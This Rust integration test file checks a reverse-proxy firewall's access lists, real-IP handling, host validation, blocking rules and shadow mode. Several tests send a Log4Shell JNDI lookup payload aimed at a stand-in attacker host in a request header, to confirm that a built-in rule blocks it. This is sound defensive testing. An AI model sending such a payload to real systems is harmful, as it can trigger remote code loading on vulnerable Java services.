//! Integration tests for the access list and the rules, run against in-process servers.
//!
//! The stub decision backend counts its calls, so each test can check whether a
//! deterministic decision reached the backend at all.

mod common;

use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use bytes::Bytes;
use common::{BoxError, StubBehavior, StubDecider, TestResult, Upstream, send, start_proxy};
use http::{Method, StatusCode};
use rstest::rstest;
use serde_json::Value;

/// A unique file path under the temp directory.
fn log_path(name: &str) -> PathBuf {
    std::env::temp_dir().join(format!("vh-rules-{}-{name}.log", std::process::id()))
}

/// Waits until a line with `request_id` appears in the file, and returns that line.
async fn wait_for_line(path: &Path, request_id: &str) -> Result<Value, BoxError> {
    let deadline = Instant::now() + Duration::from_secs(5);
    loop {
        let text = std::fs::read_to_string(path).unwrap_or_default();
        for line in text.lines() {
            if let Ok(value) = serde_json::from_str::<Value>(line)
                && value.get("request_id").and_then(Value::as_str) == Some(request_id)
            {
                return Ok(value);
            }
        }
        if Instant::now() > deadline {
            return Err(format!("no access log line for {request_id}").into());
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
}

/// Builds a configuration with the given top-level lines, and one `example.com` site
/// with `site_lines`. Access lines and rules are written in the directives.
fn config(log: &Path, decide_url: &str, upstream_url: &str, top: &str, site_lines: &str) -> String {
    format!(
        r#"
listen 127.0.0.1:0;
request_id_header x-request-id;
access_log "{log}" json;
real_ip_from 127.0.0.0/8;
real_ip_header X-Real-IP;
client_max_body_size 1024;
{top}
decision {{
    backend http;
    url "{decide_url}";
    timeout 2000ms;
    inspect_body 512;
}}
default_status 421;

site example.com {{
    upstream "{upstream_url}";
    mode enforce;
    action block;
    block_threshold 0.9;
    instruction_threshold 0.5;
    debug_headers on;
{site_lines}
}}

site shadow.test {{
    upstream "{upstream_url}";
    mode shadow;
    action block;
    block_threshold 0.9;
    instruction_threshold 0.5;
    debug_headers on;
    rule shadow-block {{
        description "block in shadow mode";
        action block;
        query ~* "forbidden";
    }}
}}
"#,
        log = log.display()
    )
}

const ATTACK_IN_QUERY: &str = "/search?q=forbidden";

#[tokio::test]
async fn top_level_deny_all_refuses_before_the_backend_and_logs_access_denied() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("deny-all");
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "deny all;",
        "",
    ))
    .await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        "/",
        "example.com",
        &[("x-request-id", "deny-1")],
        Bytes::new(),
    )
    .await?;

    assert_eq!(reply.status, StatusCode::FORBIDDEN);
    assert_eq!(
        decider.calls(),
        0,
        "an access-list refusal must not reach the backend"
    );
    let line = wait_for_line(&log, "deny-1").await?;
    assert_eq!(line["action"], "block");
    assert_eq!(line["reason"], "access_denied");
    assert_eq!(line["status"], "403");
    assert_eq!(line["site"], "example.com");
    proxy.stop().await
}

#[tokio::test]
async fn a_site_access_list_replaces_the_top_level_one() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("replace");
    let _ = std::fs::remove_file(&log);
    // The top level denies everyone; the site allows loopback, which the test client uses.
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "deny all;",
        "    allow 127.0.0.0/8;\n    deny all;",
    ))
    .await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        "/",
        "example.com",
        &[],
        Bytes::new(),
    )
    .await?;
    assert_eq!(reply.status, StatusCode::OK);
    proxy.stop().await
}

#[tokio::test]
async fn the_access_list_uses_the_realip_client_address() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("realip");
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "",
        "    allow 192.0.2.0/24;\n    deny all;",
    ))
    .await?;

    let outside = send(
        &proxy.base(),
        Method::GET,
        "/",
        "example.com",
        &[("x-real-ip", "203.0.113.9")],
        Bytes::new(),
    )
    .await?;
    assert_eq!(outside.status, StatusCode::FORBIDDEN);

    let inside = send(
        &proxy.base(),
        Method::GET,
        "/",
        "example.com",
        &[("x-real-ip", "192.0.2.5")],
        Bytes::new(),
    )
    .await?;
    assert_eq!(inside.status, StatusCode::OK);
    proxy.stop().await
}

/// Sends a request from the loopback test client with the given `X-Real-IP` lines, and returns the status.
async fn realip_status(top: &str, lines: &[&str], name: &str) -> Result<StatusCode, BoxError> {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path(name);
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        top,
        "    allow 192.0.2.0/24;\n    deny all;",
    ))
    .await?;
    let headers: Vec<(&str, &str)> = lines.iter().map(|value| ("x-real-ip", *value)).collect();
    let reply = send(
        &proxy.base(),
        Method::GET,
        "/",
        "example.com",
        &headers,
        Bytes::new(),
    )
    .await?;
    proxy.stop().await?;
    Ok(reply.status)
}

#[rstest]
// The edge (127.0.0.1, trusted) appended its line after the client's own line.
#[case::edge_appended_line_wins("", &["192.0.2.5", "203.0.113.9"], StatusCode::FORBIDDEN)]
// A single line is read as before.
#[case::single_line("", &["192.0.2.5"], StatusCode::OK)]
// Recursive: the right-most address that is not a trusted proxy is the client.
#[case::recursive_skips_trusted_hops("real_ip_recursive on;", &["192.0.2.5", "203.0.113.9, 127.0.0.2"], StatusCode::FORBIDDEN)]
// One malformed line makes the whole header untrusted, so the peer is the client.
#[case::malformed_line_uses_the_peer("", &["192.0.2.5", "not-an-address"], StatusCode::FORBIDDEN)]
#[tokio::test]
async fn every_real_ip_header_line_is_read(
    #[case] top: &str,
    #[case] lines: &[&str],
    #[case] expected: StatusCode,
) -> TestResult {
    let name = format!("realip-lines-{}", lines.len());
    assert_eq!(realip_status(top, lines, &name).await?, expected);
    Ok(())
}

#[rstest]
// Characters outside hostnames, and a port that is not digits, are refused before routing.
#[case::space("exa mple.com")]
#[case::slash("example.com/admin")]
#[case::semicolon("example.com;x")]
#[case::quote("ex\"ample.com")]
#[case::bad_port("example.com:80x")]
#[case::empty("")]
#[tokio::test]
async fn a_host_with_characters_outside_hostnames_gets_400(#[case] host: &str) -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path(&format!("invalid-host-{}", host.len()));
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "",
        "",
    ))
    .await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        "/",
        host,
        &[("x-request-id", "host-bad-1")],
        Bytes::new(),
    )
    .await?;

    assert_eq!(reply.status, StatusCode::BAD_REQUEST);
    assert_eq!(decider.calls(), 0);
    let line = wait_for_line(&log, "host-bad-1").await?;
    assert_eq!(line["action"], "reject");
    assert_eq!(line["reason"], "invalid_host");
    proxy.stop().await
}

#[rstest]
#[case::port("example.com:8080")]
#[case::trailing_dot("EXAMPLE.com.")]
#[case::ipv6_literal_with_port("[2001:db8::1]:8443")]
#[tokio::test]
async fn a_valid_host_is_routed_as_before(#[case] host: &str) -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path(&format!("valid-host-{}", host.len()));
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "",
        "",
    ))
    .await?;

    let reply = send(&proxy.base(), Method::GET, "/", host, &[], Bytes::new()).await?;

    // Hostnames that match a site are forwarded, others take default_status (421).
    assert_ne!(reply.status, StatusCode::BAD_REQUEST, "{host}");
    proxy.stop().await
}

#[tokio::test]
async fn an_access_denied_request_is_refused_even_on_a_redirect_site() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("access-action");
    let _ = std::fs::remove_file(&log);
    let text = config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "",
        "    deny all;",
    )
    .replacen(
        "    action block;\n",
        "    action redirect https://example.org/;\n",
        1,
    );
    let proxy = start_proxy(&text).await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        "/",
        "example.com",
        &[],
        Bytes::new(),
    )
    .await?;
    assert_eq!(
        reply.status,
        StatusCode::FORBIDDEN,
        "the site action does not apply to the access list"
    );
    proxy.stop().await
}

#[tokio::test]
async fn a_user_block_rule_blocks_without_the_backend_and_logs_its_id() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("block-rule");
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "",
        "    rule query-probe {\n        description \"probe in the query\";\n        action block;\n        query ~* \"forbidden\";\n    }",
    ))
    .await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        ATTACK_IN_QUERY,
        "example.com",
        &[("x-request-id", "rule-1")],
        Bytes::new(),
    )
    .await?;

    assert_eq!(reply.status, StatusCode::FORBIDDEN);
    assert_eq!(decider.calls(), 0);
    let line = wait_for_line(&log, "rule-1").await?;
    assert_eq!(line["reason"], "rule");
    assert_eq!(line["rule_id"], "query-probe");
    assert_eq!(line["action"], "block");
    proxy.stop().await
}

#[tokio::test]
async fn a_skip_rule_forwards_without_the_backend_even_for_an_attack_the_model_would_block()
-> TestResult {
    let decider = StubDecider::start().await?;
    decider.set_behavior(StubBehavior {
        attack: 0.95,
        ..StubBehavior::default()
    });
    let upstream = Upstream::start().await?;
    let log = log_path("skip-rule");
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "",
        "    rule trusted-search {\n        description \"trusted search page\";\n        action skip;\n        path = /search;\n    }",
    ))
    .await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        ATTACK_IN_QUERY,
        "example.com",
        &[("x-request-id", "skip-1")],
        Bytes::new(),
    )
    .await?;

    assert_eq!(reply.status, StatusCode::OK);
    assert_eq!(decider.calls(), 0);
    let line = wait_for_line(&log, "skip-1").await?;
    assert_eq!(line["reason"], "skip_rule");
    assert_eq!(line["rule_id"], "trusted-search");
    proxy.stop().await
}

#[tokio::test]
async fn a_block_rule_wins_over_a_skip_rule_that_also_matches() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("block-before-skip");
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "",
        "    rule skip-all-get {\n        description \"skip GET\";\n        action skip;\n        method GET;\n    }\n\
             rule block-probe {\n        description \"probe\";\n        action block;\n        query ~* \"forbidden\";\n    }",
    ))
    .await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        ATTACK_IN_QUERY,
        "example.com",
        &[],
        Bytes::new(),
    )
    .await?;

    assert_eq!(reply.status, StatusCode::FORBIDDEN);
    assert_eq!(decider.calls(), 0);
    proxy.stop().await
}

#[tokio::test]
async fn a_built_in_rule_blocks_a_log4shell_header_without_the_backend() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("builtin");
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "",
        "",
    ))
    .await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        "/",
        "example.com",
        &[
            ("x-request-id", "builtin-1"),
            ("x-probe", "${jndi:ldap://attacker.example/a}"),
        ],
        Bytes::new(),
    )
    .await?;

    assert_eq!(reply.status, StatusCode::FORBIDDEN);
    assert_eq!(decider.calls(), 0);
    let line = wait_for_line(&log, "builtin-1").await?;
    assert_eq!(line["rule_id"], "vh-expr-001");
    proxy.stop().await
}

#[tokio::test]
async fn builtin_rules_off_leaves_the_same_request_to_the_model() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("builtin-off");
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "builtin_rules off;",
        "",
    ))
    .await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        "/",
        "example.com",
        &[
            ("x-request-id", "builtin-off-1"),
            ("x-probe", "${jndi:ldap://attacker.example/a}"),
        ],
        Bytes::new(),
    )
    .await?;

    assert_eq!(reply.status, StatusCode::OK);
    assert_eq!(decider.calls(), 1);
    let line = wait_for_line(&log, "builtin-off-1").await?;
    assert_eq!(line["rule_id"], "");
    proxy.stop().await
}

#[tokio::test]
async fn a_disabled_built_in_rule_no_longer_fires() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("disabled");
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "disable_rule vh-expr-001;",
        "",
    ))
    .await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        "/",
        "example.com",
        &[("x-probe", "${jndi:ldap://attacker.example/a}")],
        Bytes::new(),
    )
    .await?;

    assert_eq!(reply.status, StatusCode::OK);
    proxy.stop().await
}

#[tokio::test]
async fn a_rule_block_is_not_changed_by_a_rate_limited_or_failed_backend() -> TestResult {
    let upstream = Upstream::start().await?;
    let log = log_path("failures");
    let _ = std::fs::remove_file(&log);
    for status in [
        StatusCode::TOO_MANY_REQUESTS,
        StatusCode::INTERNAL_SERVER_ERROR,
    ] {
        let decider = StubDecider::start().await?;
        decider.set_behavior(StubBehavior {
            status,
            ..StubBehavior::default()
        });
        let proxy = start_proxy(&config(
            &log,
            &decider.decide_url(),
            &upstream.url(),
            "",
            "    rule query-probe {\n        description \"probe\";\n        action block;\n        query ~* \"forbidden\";\n    }",
        ))
        .await?;

        let reply = send(
            &proxy.base(),
            Method::GET,
            ATTACK_IN_QUERY,
            "example.com",
            &[],
            Bytes::new(),
        )
        .await?;

        assert_eq!(
            reply.status,
            StatusCode::FORBIDDEN,
            "a block rule holds when the backend answers {status}"
        );
        proxy.stop().await?;
    }
    Ok(())
}

#[tokio::test]
async fn shadow_mode_forwards_a_rule_hit_and_records_what_it_would_have_done() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("shadow");
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "",
        "",
    ))
    .await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        ATTACK_IN_QUERY,
        "shadow.test",
        &[],
        Bytes::new(),
    )
    .await?;

    assert_eq!(reply.status, StatusCode::OK);
    assert_eq!(
        reply
            .headers
            .get("x-vigilant-heron")
            .and_then(|value| value.to_str().ok()),
        Some("action=allow; reason=rule; would_have=block")
    );
    assert_eq!(decider.calls(), 0);
    proxy.stop().await
}

#[tokio::test]
async fn a_top_level_rule_that_names_a_site_applies_only_to_that_site() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("scoped");
    let _ = std::fs::remove_file(&log);
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "rule shadow-only {\n    description \"d\";\n    action block;\n    site shadow.test;\n    query ~* \"forbidden\";\n}",
        "",
    ))
    .await?;

    let other = send(
        &proxy.base(),
        Method::GET,
        ATTACK_IN_QUERY,
        "example.com",
        &[],
        Bytes::new(),
    )
    .await?;
    assert_eq!(
        other.status,
        StatusCode::OK,
        "example.com does not run the rule"
    );
    let named = send(
        &proxy.base(),
        Method::GET,
        ATTACK_IN_QUERY,
        "shadow.test",
        &[],
        Bytes::new(),
    )
    .await?;
    assert_eq!(
        named
            .headers
            .get("x-vigilant-heron")
            .and_then(|value| value.to_str().ok()),
        Some("action=allow; reason=rule; would_have=block")
    );
    proxy.stop().await
}

#[tokio::test]
async fn a_body_rule_sees_only_the_inspected_prefix() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("body-prefix");
    let _ = std::fs::remove_file(&log);
    // inspect_body is 512 bytes in this configuration; the marker sits after that.
    let proxy = start_proxy(&config(
        &log,
        &decider.decide_url(),
        &upstream.url(),
        "",
        "    rule body-marker {\n        description \"marker\";\n        action block;\n        body ~ \"MARKER\";\n    }",
    ))
    .await?;

    let mut late = vec![b'a'; 600];
    late.extend_from_slice(b"MARKER");
    let reply = send(
        &proxy.base(),
        Method::POST,
        "/upload",
        "example.com",
        &[],
        Bytes::from(late),
    )
    .await?;
    assert_eq!(
        reply.status,
        StatusCode::OK,
        "a marker past inspect_body is not seen by the rule"
    );

    let early = send(
        &proxy.base(),
        Method::POST,
        "/upload",
        "example.com",
        &[],
        Bytes::from_static(b"text with MARKER inside"),
    )
    .await?;
    assert_eq!(early.status, StatusCode::FORBIDDEN);
    proxy.stop().await
}

#[tokio::test]
async fn a_denied_client_on_a_shadow_site_is_forwarded_and_recorded_as_a_block() -> TestResult {
    let decider = StubDecider::start().await?;
    let upstream = Upstream::start().await?;
    let log = log_path("shadow-access");
    let _ = std::fs::remove_file(&log);
    let text = config(&log, &decider.decide_url(), &upstream.url(), "", "").replace(
        "    rule shadow-block {",
        "    deny all;\n    rule shadow-block {",
    );
    let proxy = start_proxy(&text).await?;

    let reply = send(
        &proxy.base(),
        Method::GET,
        "/",
        "shadow.test",
        &[],
        Bytes::new(),
    )
    .await?;

    assert_eq!(
        reply.status,
        StatusCode::OK,
        "shadow mode forwards everything, the access list included"
    );
    assert_eq!(
        reply
            .headers
            .get("x-vigilant-heron")
            .and_then(|value| value.to_str().ok()),
        Some("action=allow; reason=access_denied; would_have=block")
    );
    assert_eq!(decider.calls(), 0);
    proxy.stop().await
}
